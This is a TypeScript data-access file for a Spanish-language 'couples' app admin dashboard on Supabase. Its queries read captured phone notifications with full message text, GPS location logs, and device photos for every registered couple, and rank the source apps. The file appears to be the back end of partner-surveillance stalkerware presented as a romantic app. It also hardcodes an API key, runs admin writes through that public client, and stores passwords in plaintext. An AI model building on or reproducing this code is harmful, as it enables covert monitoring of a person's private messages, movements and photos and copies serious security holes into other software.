// lib/supabase.ts
import { createClient } from '@supabase/supabase-js'

export const SUPABASE_URL     = 'https://hfivvqxrqxiijuskqowe.supabase.co'
export const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhmaXZ2cXhycXhpaWp1c2txb3dlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTQ4MDAwOTcsImV4cCI6MjExMDM3NjA5N30.F9BwrkNOEQmbfG3iFOv-tkDQzyxgN3Cb55A2o-FgP58'

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)

// ─── Tipos ────────────────────────────────────────────────────────────────────

export interface Couple {
  id: string
  username: string
  password?: string
  couple_names: string
  partner_one: string
  partner_two: string
  anniversary_date: string
  couple_code: string
  plan_tier: string
  created_at?: string
}

export interface NotificationLog {
  id: string
  couple_id: string
  app_name: string
  package_name: string
  title: string | null
  text: string | null
  big_text: string | null
  sub_text: string | null
  received_at: string
  created_at: string
  // join
  couples?: { couple_names: string; partner_one: string; partner_two: string }
}

export interface ChatMessage {
  id: string
  couple_id: string
  sender: string
  text: string
  time_label: string
  created_at: string
}

export interface Memory {
  id: string
  couple_id: string
  author: string
  title: string
  content: string
  date_str: string
  created_at: string
}

export interface Plan {
  id: string
  couple_id: string
  title: string
  category: string
  completed: boolean
  created_at: string
}

export interface SyncedPhoto {
  id: string
  couple_id: string
  device_owner: string
  photo_name?: string
  photo_url: string
  captured_at?: string
  created_at: string
  couples?: { couple_names: string; partner_one: string; partner_two: string }
}

export async function getSyncedPhotos(
  options: { coupleId?: string; limit?: number } = {}
): Promise<SyncedPhoto[]> {
  let q = supabase
    .from('synced_photos')
    .select('*, couples(couple_names,partner_one,partner_two)')
    .order('created_at', { ascending: false })
    .limit(options.limit ?? 60)

  if (options.coupleId) {
    q = q.eq('couple_id', options.coupleId)
  }

  const { data } = await q
  return (data ?? []) as SyncedPhoto[]
}

export interface LocationLog {
  id: string
  couple_id: string
  device_owner: string
  latitude: number
  longitude: number
  accuracy?: number
  speed?: number
  battery_level?: number
  recorded_at: string
  created_at: string
  couples?: { couple_names: string; partner_one: string; partner_two: string }
}

export async function getLatestLocations(
  options: { coupleId?: string; limit?: number } = {}
): Promise<LocationLog[]> {
  let q = supabase
    .from('location_logs')
    .select('*, couples(couple_names,partner_one,partner_two)')
    .order('recorded_at', { ascending: false })
    .limit(options.limit ?? 50)

  if (options.coupleId) {
    q = q.eq('couple_id', options.coupleId)
  }

  const { data } = await q
  return (data ?? []) as LocationLog[]
}

// ─── Queries admin ───────────────────────────────────────────────────────────

export async function getAllCouples(): Promise<Couple[]> {
  const { data } = await supabase
    .from('couples')
    .select('*')
    .order('created_at', { ascending: false })
  return (data ?? []) as Couple[]
}

export async function createCouple(newCouple: {
  username: string
  password: string
  partner_one: string
  partner_two?: string
  couple_names?: string
  anniversary_date?: string
  plan_tier?: string
  couple_code?: string
}) {
  const code =
    newCouple.couple_code ||
    `AMOR-${Math.floor(1000 + Math.random() * 9000)}`

  const coupleNames =
    newCouple.couple_names ||
    (newCouple.partner_two
      ? `${newCouple.partner_one} & ${newCouple.partner_two}`
      : `${newCouple.partner_one} & Pareja`)

  const { data, error } = await supabase
    .from('couples')
    .insert([
      {
        username: newCouple.username.trim(),
        password: newCouple.password.trim(),
        partner_one: newCouple.partner_one.trim(),
        partner_two: newCouple.partner_two?.trim() || 'Pendiente',
        couple_names: coupleNames,
        anniversary_date: newCouple.anniversary_date || new Date().toISOString().split('T')[0],
        plan_tier: newCouple.plan_tier || 'Edición Dorada Exclusiva',
        couple_code: code.toUpperCase(),
      },
    ])
    .select()
    .single()

  if (error) throw error
  return data as Couple
}

export async function deleteCouple(id: string) {
  const { error } = await supabase.from('couples').delete().eq('id', id)
  if (error) throw error
}

export async function updateCouple(id: string, updates: Partial<Couple>) {
  const { data, error } = await supabase
    .from('couples')
    .update(updates)
    .eq('id', id)
    .select()
    .single()

  if (error) throw error
  return data as Couple
}

export async function getNotificationLogs(
  options: { coupleId?: string; appName?: string; limit?: number; offset?: number } = {}
): Promise<{ data: NotificationLog[]; count: number }> {
  let q = supabase
    .from('notification_logs')
    .select('*, couples(couple_names,partner_one,partner_two)', { count: 'exact' })
    .order('received_at', { ascending: false })
    .limit(options.limit ?? 50)

  if (options.offset) q = q.range(options.offset, (options.offset) + (options.limit ?? 50) - 1)
  if (options.coupleId) q = q.eq('couple_id', options.coupleId)
  if (options.appName)  q = q.ilike('app_name', `%${options.appName}%`)

  const { data, count } = await q
  return { data: (data ?? []) as NotificationLog[], count: count ?? 0 }
}

export async function getDashboardStats() {
  const [couples, notifications, chats, memories, plans] = await Promise.all([
    supabase.from('couples').select('id', { count: 'exact', head: true }),
    supabase.from('notification_logs').select('id', { count: 'exact', head: true }),
    supabase.from('chat_messages').select('id', { count: 'exact', head: true }),
    supabase.from('memories').select('id', { count: 'exact', head: true }),
    supabase.from('plans').select('id', { count: 'exact', head: true }),
  ])
  return {
    couples:       couples.count      ?? 0,
    notifications: notifications.count ?? 0,
    chats:         chats.count         ?? 0,
    memories:      memories.count      ?? 0,
    plans:         plans.count         ?? 0,
  }
}

export async function getTopApps(limit = 8) {
  const { data } = await supabase
    .from('notification_logs')
    .select('app_name, package_name')
  if (!data) return []
  const counts: Record<string, { app_name: string; package_name: string; count: number }> = {}
  for (const row of data) {
    const key = row.package_name
    if (!counts[key]) counts[key] = { app_name: row.app_name, package_name: row.package_name, count: 0 }
    counts[key].count++
  }
  return Object.values(counts)
    .sort((a, b) => b.count - a.count)
    .slice(0, limit)
}

export async function getRecentActivity() {
  const [notifs, chats] = await Promise.all([
    supabase
      .from('notification_logs')
      .select('id, app_name, title, received_at, couples(couple_names)')
      .order('received_at', { ascending: false })
      .limit(5),
    supabase
      .from('chat_messages')
      .select('id, sender, text, created_at, couples(couple_names)')
      .order('created_at', { ascending: false })
      .limit(5),
  ])
  return {
    notifications: (notifs.data ?? []) as any[],
    messages:      (chats.data  ?? []) as any[],
  }
}
